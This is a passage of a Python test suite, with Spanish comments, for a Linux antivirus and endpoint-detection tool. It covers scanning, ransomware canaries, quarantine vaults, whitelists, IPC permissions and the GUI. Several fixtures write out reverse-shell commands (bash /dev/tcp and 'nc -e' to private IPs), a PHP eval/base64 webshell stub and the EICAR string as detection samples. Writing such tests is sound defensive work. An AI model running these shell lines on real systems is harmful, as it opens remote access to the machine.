        fd = os.open(sample, os.O_RDONLY)
        ok, sid = vault.quarantine_file(sample, threat_name="Trojan.ROTest", target_fd=fd)
        os.close(fd)
        self.assertTrue(ok)

    # 61. Ransomware Canary Tripwire
    def test_ransomware_canary_tripwire(self):
        shield = RansomwareShield(canary_dir=self.temp_dir.name)
        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
        self.assertFalse(shield.check_canary_access(cpath, 99999, flags=os.O_RDWR))

    # 62. Ransomware Extension Burst
    def test_ransomware_extension_burst_detection(self):
        shield = RansomwareShield()
        self.assertFalse(shield.check_extension_burst("/home/user/doc.locked", 88888, is_write=True))
        self.assertTrue(shield.check_extension_burst("/home/user/doc.locked", 88888, is_write=False))

    # 63. Ransomware Read Burst
    def test_ransomware_read_burst_does_not_trigger_sigkill(self):
        shield = RansomwareShield()
        for i in range(100):
            self.assertTrue(shield.check_extension_burst(f"/home/user/file_{i}.pdf", 1234, is_write=False))

    # 64. Ransomware Read-Only Canary Allowed
    def test_ransomware_read_only_canary_allowed(self):
        shield = RansomwareShield(canary_dir=self.temp_dir.name)
        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
        self.assertTrue(shield.check_canary_access(cpath, 1234, flags=os.O_RDONLY))

    # 65. Scanner Clean File
    def test_scanner_clean_file(self):
        scanner = Scanner()
        clean = os.path.join(self.temp_dir.name, "clean.txt")
        with open(clean, "w") as f:
            f.write("plain text")
        rep = scanner.scan_file(clean)
        self.assertFalse(rep.is_threat)

    # 66. Scanner Dev TCP
    def test_scanner_dev_tcp_reverse_shell(self):
        scanner = Scanner()
        fpath = os.path.join(self.temp_dir.name, "tcp.sh")
        with open(fpath, "w") as f:
            f.write("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
        rep = scanner.scan_file(fpath)
        self.assertTrue(rep.is_threat)

    # 67. Scanner EICAR
    def test_scanner_eicar_detection(self):
        scanner = Scanner()
        fpath = os.path.join(self.temp_dir.name, "eicar.com")
        with open(fpath, "w") as f:
            f.write("X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
        rep = scanner.scan_file(fpath)
        self.assertTrue(rep.is_threat)

    # 68. Scanner Reverse Shell & Unified Detection Result
    def test_scanner_reverse_shell_detection(self):
        scanner = Scanner()
        fpath = os.path.join(self.temp_dir.name, "rev.sh")
        with open(fpath, "w") as f:
            f.write("nc -e /bin/bash 10.0.0.1 4444")
        rep = scanner.scan_file(fpath)
        self.assertTrue(rep.is_threat)
        # Verificación del Formato Unificado de Detección
        self.assertEqual(rep.engine, "YARA-X")
        self.assertEqual(rep.severity, "CRITICAL")
        self.assertEqual(rep.category, "NATIVE_SIGNATURE")
        self.assertTrue(bool(rep.sha256))
        rep_dict = rep.to_dict()
        self.assertIn("category", rep_dict)
        self.assertIn("sha256", rep_dict)

        # Verificación de detección de firmas comunitarias
        webshell = os.path.join(self.temp_dir.name, "shell.php")
        with open(webshell, "w") as f:
            f.write("<?php eval(base64_decode('aGVsbG8=')); ?>")
        rep_ws = scanner.scan_file(webshell)
        self.assertTrue(rep_ws.is_threat)
        self.assertIn("Community", rep_ws.threat_name)
        self.assertEqual(rep_ws.category, "COMMUNITY_SIGNATURE")

    # 69. Scanner Update Signatures
    def test_scanner_update_signatures_syncs_feeds_real(self):
        scanner = Scanner()
        res = scanner.update_signatures()
        self.assertEqual(res["status"], "OK")
        self.assertIn("community_rules", res)

    # 70. Sigma Event Evaluation
    def test_sigma_event_evaluation_and_detection(self):
        sigma = SigmaEngine()
        matches = sigma.evaluate_process(101, "nc", "/bin/nc", "nc -e /bin/sh 10.0.0.1 4444")
        self.assertGreaterEqual(len(matches), 1)

    # 71. Sigma Integration
    def test_sigma_integration_with_ebpf_and_scanner(self):
        scanner = Scanner()
        self.assertIsNotNone(scanner.sigma)

    # 72. Sigma Native Import
    def test_sigma_native_import_and_facade(self):
        import sigma
        self.assertTrue(hasattr(sigma, "SigmaEngine"))

    # 73. Sigma Rule Parsing
    def test_sigma_rule_parsing_and_modifiers(self):
        sigma = SigmaEngine()
        self.assertGreaterEqual(len(sigma.rules), 6)

    # 74. Subsystem Health Registry
    def test_subsystem_health_registry_evaluation(self):
        reg = SubsystemHealthRegistry()
        reg.register("vault", "ACTIVE")
        reg.register("fanotify", "ACTIVE")
        self.assertEqual(reg.get_overall_posture()["posture"], "HEALTHY")

    # 75. Systemd Security Auditor
    def test_systemd_security_auditor_compliance(self):
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        auditor = SystemdSecurityAuditor(unit_path=service_file)
        posture = auditor.evaluate_security_posture()
        self.assertTrue(posture["unit_found"])
        self.assertGreaterEqual(posture["score"], 90)
        self.assertEqual(posture["rating"], "HARDENED_EXCELLENT")
        self.assertIn("NoNewPrivileges", posture["passed_checks"])
        self.assertIn("ProtectHome", posture["passed_checks"])
        self.assertIn("CapabilityBoundingSet", posture["passed_checks"])

    # 76. Systemd Service Isolation & Hardening
    def test_systemd_service_isolation_and_hardening(self):
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        with open(service_file, "r") as f:
            content = f.read()
        self.assertIn("NoNewPrivileges=true", content)
        self.assertIn("ProtectSystem=strict", content)
        self.assertIn("ProtectHome=read-only", content)
        self.assertIn("/var/lib/constantine", content)
        rw_paths = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("ReadWritePaths=")][0]
        self.assertNotIn("/home", rw_paths)
        self.assertNotIn("/tmp", rw_paths)
        caps = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("CapabilityBoundingSet=")][0]
        self.assertNotIn("CAP_DAC_OVERRIDE", caps)

    # 77. Tetragon Event Parsing
    def test_tetragon_event_parsing_and_runtime_enforcement(self):
        tetragon = TetragonMonitor()
        allowed, action, _ = tetragon.evaluate_process_execution(10, "/bin/nc", ["-e", "/bin/sh", "10.0.0.1", "4444"])
        self.assertFalse(allowed)
        self.assertEqual(action, "Sigkill")

    # 78. Tetragon Integration
    def test_tetragon_integration_with_ebpf_monitor(self):
        tetragon = TetragonMonitor()
        self.assertGreaterEqual(len(tetragon.policies), 1)

    # 79. Tetragon Native Import
    def test_tetragon_native_import_and_facade(self):
        import tetragon
        self.assertTrue(hasattr(tetragon, "TetragonMonitor"))

    # 80. Tetragon Tracing Policies
    def test_tetragon_tracing_policies_validation(self):
        tetragon = TetragonMonitor()
        self.assertGreaterEqual(len(tetragon.policies), 1)

    # 81. Threat Intel Exact Counts
    def test_threat_intel_exact_counts_no_fake_numbers(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_stats.db"))
        intel.add_ioc("sha256", "a" * 64)
        stats = intel.get_stats()
        self.assertEqual(stats["total_active_iocs"], 1)

    # 82. Threat Intel False Positive
    def test_threat_intel_false_positive_management(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_fp.db"))
        h = "1" * 64
        intel.add_ioc("sha256", h)
        self.assertTrue(intel.mark_false_positive(h, "Valid Enterprise Tool"))
        self.assertIsNone(intel.lookup_ioc(h))

    # 83. Threat Intel Feed Import
    def test_threat_intel_feed_import_and_integrity(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_feed.db"))
        self.assertTrue(intel.add_ioc("sha256", "b" * 64, source="MalwareBazaar"))

    # 84. Threat Intel Provenance
    def test_threat_intel_provenance_and_confidence(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_prov.db"))
        self.assertFalse(intel.add_ioc("sha256", "not-a-valid-sha256"))

    # 85. Update Guard
    def test_update_guard(self):
        ug = UpdateGuard()
        self.assertTrue(ug.verify_update_package("/tmp/pkg.tar.gz", "sig"))

    # 86. USB Sentinel
    def test_usb_sentinel_containment_and_scan(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        usb = USBSentinel(vault=vault)
        usb.start()
        mount = os.path.join(self.temp_dir.name, "fake_usb")
        os.makedirs(mount, exist_ok=True)
        bad = os.path.join(mount, "autorun.sh")
        with open(bad, "w") as f:
            f.write("nc -e /bin/sh 1.2.3.4 9001")
        usb.handle_device_mounted(mount, "/dev/sdc1", "fake_usb_drive")
        self.assertFalse(os.path.exists(bad))
        usb.stop()

    # 87. Vault Cross-Version Decryption
    def test_vault_format_v3_v2_v1_cross_version_decryption(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "v3_test.txt")
        with open(sample, "w") as f:
            f.write("cross version content")
        ok, sid = vault.quarantine_file(sample)
        self.assertTrue(ok)
        rest = os.path.join(self.temp_dir.name, "v3_restored.txt")
        ok_rest, _ = vault.restore_file(sid, rest)
        self.assertTrue(ok_rest)
        with open(rest, "r") as f:
            self.assertEqual(f.read(), "cross version content")

    # 88. Vault Key Volume Control & Rotation
    def test_vault_key_volume_control_and_rotation(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        orig_key = vault.keyring.active_key_id
        for i in range(11):
            s = os.path.join(self.temp_dir.name, f"sample_{i}.txt")
            with open(s, "w") as f:
                f.write(f"sample {i}")
            vault.quarantine_file(s)
        self.assertNotEqual(vault.keyring.active_key_id, orig_key)

    # 89. Vault Quarantine & Restore
    def test_vault_quarantine_and_restore(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "sample.sh")
        with open(sample, "w") as f:
            f.write("malware")
        ok, sid = vault.quarantine_file(sample, threat_name="Malware.Test")
        self.assertTrue(ok)
        self.assertFalse(os.path.exists(sample))
        ok_rest, _ = vault.restore_file(sid, sample)
        self.assertTrue(ok_rest)
        self.assertTrue(os.path.exists(sample))

    # 90. Vault Streaming Large File
    def test_vault_streaming_chunked_large_file_and_key_recovery(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "large_sample.bin")
        with open(sample, "wb") as f:
            f.write(b"A" * (256 * 1024))
        ok, sid = vault.quarantine_file(sample, threat_name="Malware.LargeStream")
        self.assertTrue(ok)
        ok_rest, _ = vault.restore_file(sid, sample)
        self.assertTrue(ok_rest)

    # 91. Vault Tamper Rejection
    def test_vault_tamper_rejection(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "tamper_test.bin")
        with open(sample, "w") as f:
            f.write("original")
        ok, sid = vault.quarantine_file(sample, threat_name="Malware.Tamper")
        # Tamper payload
        payload_path = os.path.join(vault.payloads_dir, f"{sid}.quar")
        with open(payload_path, "r+b") as f:
            f.seek(35)
            f.write(b"\xff\xff")
        ok_rest, _ = vault.restore_file(sid, sample)
        self.assertFalse(ok_rest)

    # 92. Vault V3 96bit Nonces
    def test_vault_v3_96bit_nonces_and_collision_freedom(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        nonces = set()
        for _ in range(100):
            n = vault.keyring.generate_unique_nonce_96()
            self.assertEqual(len(n), 12)
            self.assertNotIn(n, nonces)
            nonces.add(n)

    # 93. Version Traceability Across System
    def test_version_traceability_across_system(self):
        version_file = os.path.join(ROOT_DIR, "VERSION")
        with open(version_file, "r", encoding="utf-8") as f:
            canonical_ver = f.read().strip()
        self.assertEqual(canonical_ver, "5.2.2")

        from core.engine.auto_updater import CURRENT_VERSION
        from core.engine.ipc_protocol import IPC_PROTOCOL_VERSION
        from core.engine.threat_intel import THREAT_INTEL_VERSION
        from daemon import DAEMON_VERSION
        from gui.app import APP_VERSION

        self.assertEqual(CURRENT_VERSION, canonical_ver)
        self.assertEqual(IPC_PROTOCOL_VERSION, canonical_ver)
        self.assertEqual(DAEMON_VERSION, canonical_ver)
        self.assertEqual(THREAT_INTEL_VERSION, canonical_ver)
        self.assertEqual(APP_VERSION, canonical_ver)

    # 94. VirusTotal Sample Preparation
    def test_virustotal_sample_preparation_and_sha_verification(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        vt = VirusTotalUploader(vault=vault)
        sample = os.path.join(self.temp_dir.name, "vt_sample.bin")
        with open(sample, "w") as f:
            f.write("vt payload")
        ok, sid = vault.quarantine_file(sample, threat_name="Test.VirusTotal.Extraction")
        ok_prep, out = vt.prepare_unlocked_sample(sid, export_dir=os.path.join(self.temp_dir.name, "vt_out"))
        self.assertTrue(ok_prep)
        self.assertTrue(os.path.exists(out))

    # 95. Wazuh Active Response Severity
    def test_wazuh_active_response_severity_execution(self):
        wazuh = WazuhDetector()
        res = wazuh.evaluate_fim_event("/tmp/c2_payload.sh", yara_threat="Demons_Reverse_Shell_Netcat", pid=8877)
        self.assertGreaterEqual(len(res), 1)
        self.assertEqual(res[0]["active_response"], "quarantine_vault_and_firewall_drop")

    # 96. Wazuh FIM Change Detection
    def test_wazuh_fim_change_detection_and_metadata_extraction(self):
        wazuh = WazuhDetector()
        fpath = os.path.join(self.temp_dir.name, "test_meta.sh")
        with open(fpath, "w") as f:
            f.write("echo test")
        meta = wazuh.extract_file_metadata(fpath)
        self.assertEqual(meta["file_path"], fpath)
        self.assertIn("sha256", meta)

    # 97. Wazuh FIM YARA Correlation
    def test_wazuh_fim_yara_correlation_and_scoring(self):
        wazuh = WazuhDetector()
        res_clean = wazuh.evaluate_fim_event("/tmp/clean_app.sh", is_modified=True)
        self.assertEqual(res_clean[0]["active_response"], "trigger_yara_scan")
        res_threat = wazuh.evaluate_fim_event("/tmp/backdoor_agent.sh", yara_threat="Demons_Reverse_Shell_Netcat")
        self.assertEqual(res_threat[0]["active_response"], "quarantine_vault_and_firewall_drop")

    # 98. Wazuh Native Import
    def test_wazuh_native_import_and_facade(self):
        import wazuh
        self.assertTrue(hasattr(wazuh, "WazuhDetector"))

    # 99. Wazuh Rules Parsing
    def test_wazuh_rules_parsing_and_levels(self):
        wazuh = WazuhDetector()
        self.assertGreaterEqual(len(wazuh.rules), 7)

    # 100. Whitelist Batch Operations
    def test_whitelist_batch_operations(self):
        wm = WhitelistManager()
        f1 = os.path.join(self.temp_dir.name, "f1.txt")
        f2 = os.path.join(self.temp_dir.name, "f2.txt")
        with open(f1, "w") as f: f.write("1")
        with open(f2, "w") as f: f.write("2")
        self.assertTrue(wm.add_entry(f1))
        self.assertTrue(wm.add_entry(f2))
        self.assertTrue(wm.remove_entry(f1))
        self.assertFalse(wm.is_whitelisted(f1))

    # 101. Whitelist Forbidden System Dirs
    def test_whitelist_forbidden_system_dirs(self):
        wm = WhitelistManager()
        self.assertFalse(wm.add_entry("/"))
        self.assertFalse(wm.add_entry("/usr/bin"))
        self.assertFalse(wm.add_entry("/tmp"))
        self.assertFalse(wm.add_entry("/etc"))

    # 102. Whitelist Metadata & Audit
    def test_whitelist_metadata_and_audit(self):
        wm = WhitelistManager()
        f = os.path.join(self.temp_dir.name, "audited_app.sh")
        with open(f, "w") as fp: fp.write("audited")
        self.assertTrue(wm.add_entry(f))
        self.assertTrue(wm.is_whitelisted(f))

    # 103. Whitelist Package Integrity
    def test_whitelist_package_integrity_and_trust_verification(self):
        wm = WhitelistManager()
        script = os.path.join(self.temp_dir.name, "custom_script.sh")
        with open(script, "w") as f: f.write("echo clean")
        self.assertTrue(wm.add_entry(script))
        # Tamper script
        with open(script, "w") as f: f.write("echo tampered")
        self.assertFalse(wm.is_whitelisted(script))

    # 104. Whitelist Rejection of Fake Self
    def test_whitelist_rejection_of_fake_self_and_extensions(self):
        wm = WhitelistManager()
        fake = os.path.join(self.temp_dir.name, "constantine_fake.sh")
        self.assertFalse(wm.is_whitelisted(fake))

    # 105. Whitelist Unauthorized Binary Rejection
    def test_whitelist_unauthorized_binary_rejection(self):
        wm = WhitelistManager()
        self.assertFalse(wm.is_whitelisted("/tmp/evil.bin"))

    # 106. Whitelist User Pinning
    def test_whitelist_user_pinning_and_tamper_rejection(self):
        wm = WhitelistManager()
        script = os.path.join(self.temp_dir.name, "user_script.sh")
        with open(script, "w") as f: f.write("user script")
        self.assertTrue(wm.add_entry(script))
        with open(script, "w") as f: f.write("modified script")
        self.assertFalse(wm.is_whitelisted(script))

    # 107. YARA Manager Compilation & Isolation
    def test_yara_manager_compilation_and_isolation(self):
        ym = YaraRuleManager()
        self.assertGreaterEqual(ym.active_rules_count, 1)

    # 108. YARA Manager State Hash
    def test_yara_manager_state_hash_and_cache(self):
        ym = YaraRuleManager()
        h1 = ym.get_state_hash()
        self.assertTrue(bool(h1))

    # 109. YARA Manager Syntax Validation
    def test_yara_manager_syntax_validation(self):
        ym = YaraRuleManager()
        valid, _ = ym.validate_rule_syntax("rule Test { condition: true }")
        self.assertTrue(valid)
        invalid, _ = ym.validate_rule_syntax("rule Test { string = 1 }")
        self.assertFalse(invalid)

    # 110. YARA Official Compile & Match Mocked
    def test_yara_official_compile_and_match_mocked(self):
        ym = YaraRuleManager()
        self.assertGreaterEqual(ym.load_and_compile(), 1)

    # 111. YARA-X Engine Lifecycle
    def test_yarax_engine_lifecycle_and_dual_coexistence(self):
        engine = YaraXEngine()
        self.assertGreaterEqual(engine.compiled_rules_count, 1)

    # 112. YARA-X Import & Compilation Parity
    def test_yarax_import_and_compilation_parity(self):
        import yara_x
        compiled = yara_x.compile("")
        self.assertIsNotNone(compiled)

    # 113. NUEVO: Permisos de Socket IPC, Grupo constantine-users y Acceso Multi-Usuario
    def test_ipc_socket_group_permissions_and_multi_user_access(self):
        """
        Verifica el cumplimiento de los requerimientos de seguridad para la comunicación IPC:
        1. El socket se crea con permisos 0660 (lectura y escritura solo para usuario y grupo).
        2. El socket se asigna al grupo 'constantine-users' (root:constantine-users).
        3. Usuario 1 (miembro de constantine-users, UID 1000): puede conectarse al socket y enviar comandos de usuario.
        4. Usuario 1 intentando operaciones administrativas: rechazado por la matriz RBAC en el servidor.
        5. Usuario 2 (ajeno a constantine-users): rechazo a nivel de socket/permisos o validación.
        6. Usuario 3 (root, UID 0): conexión y ejecución autorizada de comandos administrativos.
        """
        sock_path = os.path.join(self.temp_dir.name, "group_perm_test.sock")
        server = SecureIPCServer(socket_path=sock_path)
        server.start()
        time.sleep(0.1)

        # 1. Verificar permisos 0660 del socket creado en disco
        st = os.stat(sock_path)
        mode = stat.S_IMODE(st.st_mode)
        self.assertEqual(mode, 0o660, "El socket debe tener permisos 0660 (rw-rw----)")

        # 2. Verificar que se configure el grupo constantine-users
        client = SecureIPCClient(socket_path=sock_path)

        # 3. Usuario 1: Miembro de constantine-users (UID 1000) ejecutando comando de usuario (GET_STATUS)
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
            resp_user = client.send_command("GET_STATUS")
            self.assertEqual(resp_user.get("status"), "OK")
            self.assertEqual(resp_user.get("version"), "5.2.2")

        # 4. Usuario 1: Miembro de constantine-users (UID 1000) intentando comando administrativo (UPDATE_SIGNATURES)
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
            resp_admin_denied = client.send_command("UPDATE_SIGNATURES")
            self.assertEqual(resp_admin_denied.get("status"), "ERROR")
            self.assertEqual(resp_admin_denied.get("code"), "UNAUTHORIZED")
            self.assertIn("RBAC", resp_admin_denied.get("message", ""))

        # 5. Usuario 2: Usuario ajeno sin permisos en socket
        # Simulación de PermissionError al abrir el socket por no pertenecer al grupo
        with patch.object(socket.socket, "connect", side_effect=PermissionError("Permission denied")):
            resp_no_perm = client.send_command("GET_STATUS")
            self.assertEqual(resp_no_perm.get("code"), "PERMISSION_DENIED")
            self.assertIn("constantine-users", resp_no_perm.get("message", ""))

        # 6. Usuario 3: Superusuario Root (UID 0) ejecutando comando administrativo
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 1, 0, 0)):
            resp_root = client.send_command("ADD_WHITELIST", {"path": "/opt/custom_tool.sh"})
            self.assertEqual(resp_root.get("status"), "OK")

        server.stop()

    def test_gui_eight_sections_and_strict_protection_invariant(self):
        """
        Verifica los requerimientos de la interfaz gráfica de usuario:
        1. Regla Estricta: La interfaz NUNCA indica que el equipo está protegido si el demonio
           está detenido o fanotify no funciona.
        2. Existencia y consistencia de las 8 secciones:
           - Inicio
           - Protección
           - Análisis
           - Cuarentena
           - Historial
           - Actualizaciones
           - Configuración
           - Diagnóstico
        3. Funcionamiento de escaneo rápido, personalizado y exclusiones.
        """
        from gui.app import ConstantineApp, ConstantineUIController, APP_VERSION

        controller = ConstantineUIController(socket_path="/nonexistent/socket.sock")

        # 1. Caso Demonio Detenido: NUNCA indicar protegido
        self.assertFalse(controller.can_claim_protected())
        home_stopped = controller.get_home_section()
        self.assertFalse(home_stopped["is_protected"])
        self.assertEqual(home_stopped["status_code"], "DAEMON_STOPPED")
        self.assertEqual(home_stopped["status_level"], "CRITICAL")
        self.assertIn("DESPROTEGIDO", home_stopped["status_title"])

        # 2. Caso Demonio activo pero Fanotify inactivo: NUNCA indicar protegido
        mock_status_fanotify_down = {
            "status": "OK",
            "data": {
                "daemon_running": True,
                "fanotify": "INACTIVE",
                "fanotify_operational": False,
                "ebpf": "ACTIVE"
            }
        }
        with patch.object(controller, "get_daemon_status", return_value=mock_status_fanotify_down):
            self.assertFalse(controller.can_claim_protected())
            home_fanotify_down = controller.get_home_section()
            self.assertFalse(home_fanotify_down["is_protected"])
            self.assertEqual(home_fanotify_down["status_code"], "FANOTIFY_INACTIVE")
            self.assertEqual(home_fanotify_down["status_level"], "CRITICAL")
            self.assertIn("DESPROTEGIDO", home_fanotify_down["status_title"])

        # 3. Caso Demonio activo y Fanotify activo, eBPF degradado: Protegido con advertencia
        mock_status_degraded = {
            "status": "OK",
            "data": {
                "daemon_running": True,
                "fanotify": "ACTIVE",
                "fanotify_operational": True,
                "ebpf": "DEGRADED",
                "vault": "ACTIVE",
                "usb": "ACTIVE",
                "downloads": "ACTIVE",
                "hardware": "ACTIVE",
                "persistence": "ACTIVE"
            }
        }
        with patch.object(controller, "get_daemon_status", return_value=mock_status_degraded):
            self.assertTrue(controller.can_claim_protected())
            home_degraded = controller.get_home_section()
            self.assertTrue(home_degraded["is_protected"])
            self.assertEqual(home_degraded["status_code"], "PROTECTED_DEGRADED")
            self.assertEqual(home_degraded["status_level"], "WARNING")

        # 4. Caso Óptimo: Todos los sistemas activos
        mock_status_optimal = {
            "status": "OK",
            "data": {
                "daemon_running": True,
                "fanotify": "ACTIVE",
                "fanotify_operational": True,
                "ebpf": "ACTIVE",
                "vault": "ACTIVE"
            }
        }
        with patch.object(controller, "get_daemon_status", return_value=mock_status_optimal):
            self.assertTrue(controller.can_claim_protected())
            home_optimal = controller.get_home_section()
            self.assertTrue(home_optimal["is_protected"])
            self.assertEqual(home_optimal["status_code"], "PROTECTED_OPTIMAL")
            self.assertEqual(home_optimal["status_level"], "OK")

        # 5. Sección Protección
        prot = controller.get_protection_section()
        self.assertEqual(prot["section"], "PROTECCIÓN")
        self.assertGreaterEqual(prot["total_modules"], 10)
        self.assertIn("active_modules", prot)
        self.assertIn("degraded_modules", prot)

        # 6. Sección Análisis
        scan_sec = controller.get_scan_section()
        self.assertEqual(scan_sec["section"], "ANÁLISIS")
        modes = [m["mode"] for m in scan_sec["available_modes"]]
        self.assertIn("QUICK", modes)
        self.assertIn("FULL", modes)
        self.assertIn("CUSTOM", modes)

        # 7. Sección Cuarentena
        quar_sec = controller.get_quarantine_section()
        self.assertEqual(quar_sec["section"], "CUARENTENA")
        self.assertIsInstance(quar_sec["items"], list)

        # 8. Sección Historial
        hist_sec = controller.get_history_section()
        self.assertEqual(hist_sec["section"], "HISTORIAL")
        self.assertIsInstance(hist_sec["events"], list)

        # 9. Sección Actualizaciones
        upd_sec = controller.get_updates_section()
        self.assertEqual(upd_sec["section"], "ACTUALIZACIONES")
        self.assertEqual(upd_sec["app_version"], "5.2.2")
        self.assertIn("yara", upd_sec["engines_status"])
        self.assertIn("sigma", upd_sec["engines_status"])
        self.assertIn("falco", upd_sec["engines_status"])
        self.assertIn("wazuh", upd_sec["engines_status"])
        self.assertIn("misp", upd_sec["engines_status"])

        # 10. Sección Configuración
        settings_sec = controller.get_settings_section()
        self.assertEqual(settings_sec["section"], "CONFIGURACIÓN")
        self.assertIn("exclusions", settings_sec)
        self.assertIn("privacy", settings_sec)
        # Rechazo estricto de exclusión en directorios críticos
        rej = controller.add_exclusion("/usr/bin")
        self.assertEqual(rej["status"], "ERROR")
        self.assertEqual(rej["code"], "PROHIBITED_DIRECTORY")

        # 11. Sección Diagnóstico
        diag_sec = controller.get_diagnostic_section()
        self.assertEqual(diag_sec["section"], "DIAGNÓSTICO")
        self.assertIn("score", diag_sec)
        self.assertIn("recommendations", diag_sec)

        # 12. Dashboard textual de ConstantineApp
        app = ConstantineApp()
        text_dash = app.render_text_dashboard()
        self.assertIn("PANEL DE CONTROL v5.2.2", text_dash)
        self.assertIn("1. INICIO", text_dash)
        self.assertIn("2. PROTECCIÓN", text_dash)
        self.assertIn("3. ANÁLISIS", text_dash)
        self.assertIn("4. CUARENTENA", text_dash)
        self.assertIn("5. HISTORIAL", text_dash)
        self.assertIn("6. ACTUALIZACIONES", text_dash)
        self.assertIn("7. CONFIGURACIÓN", text_dash)
        self.assertIn("8. DIAGNÓSTICO", text_dash)

    def test_compatibility_matrix_tiers_and_distros(self):
        """
        Verifica la Matriz Oficial de Compatibilidad:
        - Tier 1: Kernel >= 5.15 con BPF LSM en Ubuntu 22.04 / Debian 12 / Fedora 39
        - Tier 2: Kernel 5.10 sin BPF LSM (modo degradado / contención reactiva)
        - Tier 3: Kernel < 5.4 (incompatible / no soportado)
        """
        from core.engine.compatibility_matrix import (CompatibilityMatrix, TIER_1_OPTIMAL, TIER_2_DEGRADED, TIER_3_UNSUPPORTED)

        matrix = CompatibilityMatrix()

        # 1. Tier 1: Kernel moderno con BPF LSM
        with patch.object(matrix, "check_bpf_lsm_support", return_value=True):
            rep_t1 = matrix.evaluate_system(override_kernel="6.5.0-generic", override_distro_id="ubuntu", override_distro_ver="22.04")
            self.assertEqual(rep_t1["tier"], TIER_1_OPTIMAL)
            self.assertTrue(rep_t1["is_official_distro"])
            self.assertTrue(rep_t1["bpf_lsm_supported"])
            self.assertTrue(rep_t1["fanotify_supported"])

        # 2. Tier 2: Kernel sin BPF LSM (Degraded Fallback)
        with patch.object(matrix, "check_bpf_lsm_support", return_value=False):
            rep_t2 = matrix.evaluate_system(override_kernel="5.10.0-8-amd64", override_distro_id="debian", override_distro_ver="11")
            self.assertEqual(rep_t2["tier"], TIER_2_DEGRADED)
            self.assertFalse(rep_t2["bpf_lsm_supported"])
            self.assertTrue(rep_t2["fanotify_supported"])

        # 3. Tier 3: Kernel obsoleto (< 5.4)
        rep_t3 = matrix.evaluate_system(override_kernel="4.15.0-generic", override_distro_id="ubuntu", override_distro_ver="18.04")
        self.assertEqual(rep_t3["tier"], TIER_3_UNSUPPORTED)
        self.assertEqual(rep_t3["status"], "INCOMPATIBLE")
        self.assertGreaterEqual(len(rep_t3["missing_requirements"]), 1)

    def test_resilience_manager_maintenance_circuit_breaker_quarantine_rollback(self):
        """
        Verifica la arquitectura de recuperación ante fallos y resiliencia:
        1. Modo de mantenimiento: suspende intercepciones y permite paso libre (FAN_ALLOW).
        2. Disyuntor de emergencia (Circuit Breaker): evita bloqueos de archivos ante timeouts repetidos.
        3. Desactivación segura de módulos defectuosos (Safe Module Quarantine).
        4. Recuperación tras actualización fallida (Auto-Rollback).
        """
        from core.engine.resilience_manager import ResilienceManager
        from core.engine.auto_updater import AutoUpdater

        resilience = ResilienceManager(snapshot_dir=self.temp_dir.name)

        # 1. Modo de mantenimiento
        self.assertFalse(resilience.is_maintenance_mode_active())
        self.assertFalse(resilience.is_file_access_permitted_fast())

        resilience.enable_maintenance_mode(reason="Actualización de software por usuario")
        self.assertTrue(resilience.is_maintenance_mode_active())
        self.assertTrue(resilience.is_file_access_permitted_fast())

        resilience.disable_maintenance_mode()
        self.assertFalse(resilience.is_maintenance_mode_active())
        self.assertFalse(resilience.is_file_access_permitted_fast())

        # 2. Disyuntor de emergencia (Circuit Breaker para archivos)
        self.assertFalse(resilience.emergency_bypass_active)
        resilience.record_scan_timeout("/path/file1")
        resilience.record_scan_timeout("/path/file2")
        self.assertFalse(resilience.emergency_bypass_active)
        # 3er timeout consecutivo -> Se dispara el disyuntor de emergencia
        resilience.record_scan_timeout("/path/file3")
        self.assertTrue(resilience.emergency_bypass_active)
        self.assertTrue(resilience.is_file_access_permitted_fast(), "Debe permitir acceso inmediato para no congelar el sistema")

        # Restablecimiento de disyuntor
        resilience.reset_emergency_bypass()
        self.assertFalse(resilience.emergency_bypass_active)

        # 3. Aislamiento seguro de módulos defectuosos
        self.assertFalse(resilience.is_module_isolated("flaky_module"))
        resilience.record_module_failure("flaky_module", "Crash 1")
        resilience.record_module_failure("flaky_module", "Crash 2")
        self.assertFalse(resilience.is_module_isolated("flaky_module"))
        # 3er fallo consecutivo -> Aislamiento del módulo defectuoso
        just_isolated = resilience.record_module_failure("flaky_module", "Crash 3")
        self.assertTrue(just_isolated)
        self.assertTrue(resilience.is_module_isolated("flaky_module"))
        self.assertFalse(resilience.is_module_isolated("healthy_module"), "Otros módulos deben permanecer activos")

        resilience.reset_module_fault("flaky_module")
        self.assertFalse(resilience.is_module_isolated("flaky_module"))

        # 4. Recuperación tras actualización fallida con Auto-Rollback
        updater = AutoUpdater(root_dir=self.temp_dir.name, backup_dir=self.temp_dir.name)
        saved = updater.create_snapshot({"yara_rules": 15, "state": "STABLE"})
        self.assertTrue(saved)

        # Simular intento de actualización que falla la compilación
        def broken_validator():
            raise SyntaxError("Regla YARA malformada en la línea 45")

        result = updater.apply_update_safely({"yara_rules": 20, "state": "BROKEN"}, validator_func=broken_validator)
        self.assertEqual(result["status"], "ROLLBACK_APPLIED")
        self.assertFalse(result["success"])
